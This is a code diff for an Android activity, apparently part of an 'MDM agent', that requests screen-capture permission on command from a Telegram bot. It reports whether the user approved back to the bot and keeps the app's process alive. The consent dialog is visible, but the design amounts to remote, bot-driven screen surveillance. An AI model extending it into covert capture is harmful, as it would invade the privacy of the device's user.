@@ -10,7 +10,6 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import android.view.Gravity
-import android.view.View
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
@@ -19,11 +18,16 @@ import com.mdm.agent.service.ScreenCaptureService
 import org.json.JSONObject
 
 /**
- * Transparent activity that requests MediaProjection permission.
- * Shows the system dialog, gets the result, and starts ScreenCaptureService.
+ * Activity that requests MediaProjection permission.
  *
- * ⚠️ CRITICAL: After user approves/denies, this activity sends a follow-up
- * notification to the Telegram bot so the admin knows the actual outcome.
+ * CRITICAL FLOW:
+ * 1. Bot sends screenshot-on
+ * 2. CommandHandler sends "waiting" response to bot
+ * 3. CommandHandler launches this Activity
+ * 4. Activity shows system MediaProjection dialog
+ * 5. User approves/denies
+ * 6. Activity sends FINAL response to bot (success/error)
+ * 7. Activity navigates back to MainActivity (instead of finish() which exits the app)
  */
 class ScreenCapturePermissionActivity : Activity() {
 
@@ -58,7 +62,7 @@ class ScreenCapturePermissionActivity : Activity() {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to request MediaProjection: ${e.message}")
             notifyBot(false, "فشل عرض طلب الموافقة: ${e.message}")
-            finish()
+            backToMain()
         }
     }
 
@@ -81,33 +85,40 @@ class ScreenCapturePermissionActivity : Activity() {
                 }
                 Log.i(TAG, "✅ MediaProjection granted - ScreenCaptureService started")
 
-                // Show confirmation UI briefly so the app doesn't "exit" suddenly
-                showConfirmationScreen(true)
-                // Notify bot that user APPROVED
-                notifyBot(true, "تم تفعيل لقطات الشاشة بنجاح")
+                // Wait briefly for the service to initialize, then notify bot + show UI
+                Handler(Looper.getMainLooper()).postDelayed({
+                    val ready = ScreenCaptureService.isReady()
+                    if (ready) {
+                        notifyBot(true, "✅ تم تفعيل لقطات الشاشة بنجاح. يمكنك الآن طلب لقطة شاشة.")
+                        showConfirmationScreen(true, "تم تفعيل لقطات الشاشة")
+                    } else {
+                        notifyBot(false, "⚠️ تمت الموافقة لكن خدمة لقطات الشاشة لم تبدأ بعد. حاول مرة أخرى.")
+                        showConfirmationScreen(false, "لم تبدأ الخدمة بشكل صحيح")
+                    }
+                }, 1500)
 
             } catch (e: SecurityException) {
                 Log.e(TAG, "❌ SecurityException: ${e.message}")
                 Toast.makeText(this, "فشل تفعيل لقطات الشاشة - صلاحية مفقودة", Toast.LENGTH_LONG).show()
-                showConfirmationScreen(false)
-                notifyBot(false, "فشل تفعيل لقطات الشاشة: ${e.message}")
+                notifyBot(false, "❌ فشل تفعيل لقطات الشاشة: ${e.message}")
+                showConfirmationScreen(false, "فشل: ${e.message}")
             } catch (e: Exception) {
                 Log.e(TAG, "❌ Failed to start service: ${e.message}", e)
-                showConfirmationScreen(false)
-                notifyBot(false, "فشل بدء خدمة لقطات الشاشة: ${e.message}")
+                notifyBot(false, "❌ فشل بدء خدمة لقطات الشاشة: ${e.message}")
+                showConfirmationScreen(false, "فشل: ${e.message}")
             }
         } else {
             Log.w(TAG, "MediaProjection permission denied or cancelled")
-            showConfirmationScreen(false)
-            notifyBot(false, "تم رفض طلب لقطات الشاشة من قبل المستخدم")
+            notifyBot(false, "❌ تم رفض طلب لقطات الشاشة من قبل المستخدم")
+            showConfirmationScreen(false, "تم رفض الطلب")
         }
     }
 
     /**
-     * Show a brief confirmation screen so the user sees what happened
-     * (instead of the app suddenly exiting).
+     * Show a confirmation screen for 2 seconds, then navigate back to MainActivity.
+     * This prevents the app from "exiting" suddenly after the user approves.
      */
-    private fun showConfirmationScreen(success: Boolean) {
+    private fun showConfirmationScreen(success: Boolean, message: String) {
         try {
             val root = LinearLayout(this).apply {
                 orientation = LinearLayout.VERTICAL
@@ -116,9 +127,8 @@ class ScreenCapturePermissionActivity : Activity() {
                 setPadding(64, 96, 64, 96)
             }
             val icon = if (success) "✅" else "❌"
-            val msg = if (success) "تم تفعيل لقطات الشاشة" else "تم رفض طلب لقطات الشاشة"
             val tv = TextView(this).apply {
-                text = "$icon\n\n$msg"
+                text = "$icon\n\n$message"
                 textSize = 18f
                 gravity = Gravity.CENTER
                 setTextColor(0xFF1A1A2E.toInt())
@@ -126,21 +136,36 @@ class ScreenCapturePermissionActivity : Activity() {
             root.addView(tv)
             setContentView(root)
 
-            // Wait 2 seconds so user sees the confirmation, then finish
             Handler(Looper.getMainLooper()).postDelayed({
-                try { finish() } catch (_: Exception) {}
+                backToMain()
             }, 2000)
         } catch (e: Exception) {
-            // If showing the screen fails, just finish
-            Handler(Looper.getMainLooper()).postDelayed({
-                try { finish() } catch (_: Exception) {}
-            }, 1000)
+            backToMain()
         }
     }
 
     /**
-     * Send a follow-up notification to the Telegram bot with the actual outcome.
-     * Uses MainActivity's static SocketManager reference.
+     * Navigate back to MainActivity instead of just finishing.
+     * This keeps the app alive (otherwise Android may kill the whole process
+     * when the last activity finishes).
+     */
+    private fun backToMain() {
+        try {
+            val intent = Intent(this, MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to navigate to MainActivity: ${e.message}")
+        }
+        try { finish() } catch (_: Exception) {}
+    }
+
+    /**
+     * Send the FINAL response to the Telegram bot with the actual outcome.
+     * This is the second message - the bot was already told "waiting".
+     * We send a NEW separate message (not command_response that consumes pending)
+     * by using a custom command suffix.
      */
     private fun notifyBot(success: Boolean, message: String) {
         try {
